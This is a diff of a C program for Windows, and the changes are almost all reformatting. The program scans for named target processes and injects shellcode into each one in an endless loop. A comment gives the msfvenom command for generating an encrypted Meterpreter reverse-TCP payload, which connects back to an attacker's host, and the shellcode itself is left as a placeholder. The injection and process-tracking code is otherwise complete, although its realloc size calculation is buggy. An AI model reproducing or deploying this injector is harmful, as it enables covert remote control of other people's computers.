@@ -18,11 +18,11 @@ static const LPCSTR targets[] = {
 
 // Process map structure.
 typedef struct {
-  // Each pid will be stored at the index of corresponding process name index in "targets" array.
-	DWORD pids[MAX_TARGETS];
-  // Array of DWORDs to track targeted pids to prevent repititive pid injection.
-	DWORD *targeted;
-	size_t targeted_size;
+    // Each pid will be stored at the index of corresponding process name index in "targets" array.
+    DWORD pids[MAX_TARGETS];
+    // Array of DWORDs to track targeted pids to prevent repititive pid injection.
+    DWORD *targeted;
+    size_t targeted_size;
 } pMap;
 
 typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
@@ -37,7 +37,8 @@ typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
 void add_pid(pMap *a, DWORD pid) {
     if (a->targeted_size > 0) {
         a->targeted = realloc(a->targeted, a->targeted_size+1 * sizeof(DWORD));
-    } else {
+    } 
+    else {
         a->targeted = malloc(sizeof(DWORD));
     }
     a->targeted[a->targeted_size] = pid;
@@ -66,7 +67,6 @@ DWORD filter_pid(LPCSTR pname) {
         do {
             if (!lstrcmpi(pt.szExeFile, pname)) {
                 CloseHandle(hsnap);
-         		DWORD handle = pt.th32ProcessID;
                 return pt.th32ProcessID;
             }
         } while (Process32Next(hsnap, &pt));
@@ -77,12 +77,12 @@ DWORD filter_pid(LPCSTR pname) {
 
 // Thread to scan for target pids.
 DWORD WINAPI scan_pids(LPVOID *lpParameter) {
-	pMap *a = (pMap*)lpParameter;
+    pMap *a = (pMap*)lpParameter;
     while (true) {
         for (size_t i=0; i<MAX_TARGETS; i++) {
             DWORD pid = filter_pid(targets[i]);
             if (check_pid(a, pid)) {
-            	a->pids[i] = pid;
+                a->pids[i] = pid;
             }
             else {
                 // Sleep to limit CPU usage.
@@ -99,7 +99,7 @@ DWORD WINAPI free_pids(LPVOID *lpParameter) {
         Sleep(900 * 1000);
         if (a->targeted_size) {
             free(a->targeted);
-        	a->targeted_size = 0;
+            a->targeted_size = 0;
         }
     }
     return 0;
@@ -153,28 +153,29 @@ void inject(unsigned char shellcode[], int PAYLOADSIZE, DWORD pid) {
 }
 
 int main() {
-  // msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=<host> LPORT=<port> RC4PASSWORD=<network_level_rc4_key> --encrypt rc4 --encrypt-key <binary_level_rc4_key>
-  unsigned char shellcode[] = 
-  < enter shellcode here >
+    // msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=<host> LPORT=<port> RC4PASSWORD=<network_level_rc4_key> --encrypt rc4 --encrypt-key <binary_level_rc4_key>
+    unsigned char shellcode[] = 
+    < enter shellcode here >
     
-  // Instantiate a instance of pMap structure to track pids and targeted pids with all values zero'd.
-  pMap a = { {0}, {0}, 0 };
+    // Instantiate a instance of pMap structure to track pids and targeted pids with all values zero'd.
+    pMap a = { {0}, {0}, 0 };
 
-  // Thread to Scan for pids.
-  CreateThread(0, 0, scan_pids, &a, 0, 0);
-  // Thread to free "targeted" array to limit memory usage.
-	CreateThread(0, 0, free_pids, &a, 0, 0);
+    // Thread to Scan for pids.
+    CreateThread(0, 0, scan_pids, &a, 0, 0);
+    // Thread to free "targeted" array to limit memory usage.
+    CreateThread(0, 0, free_pids, &a, 0, 0);
 
-	while (true) {
-		for (size_t i=0; i<MAX_TARGETS; i++)
-			if (check_pid(&a, a.pids[i])) {
-        inject(shellcode, sizeof(shellcode), a.pids[i]);
-        add_pid(&a, a.pids[i]);
-			}
-			else {
-        // Sleep for 1 second to limit cpu usage.
-				Sleep(1000);
-			}
-	}
-	return 0;
+    while (true) {
+        for (size_t i=0; i<MAX_TARGETS; i++) {
+            if (check_pid(&a, a.pids[i])) {
+                inject(shellcode, sizeof(shellcode), a.pids[i]);
+                add_pid(&a, a.pids[i]);
+            }
+            else {
+            // Sleep for 1 second to limit cpu usage.
+            Sleep(1000);
+            }
+        }
+    }
+    return 0;
 }
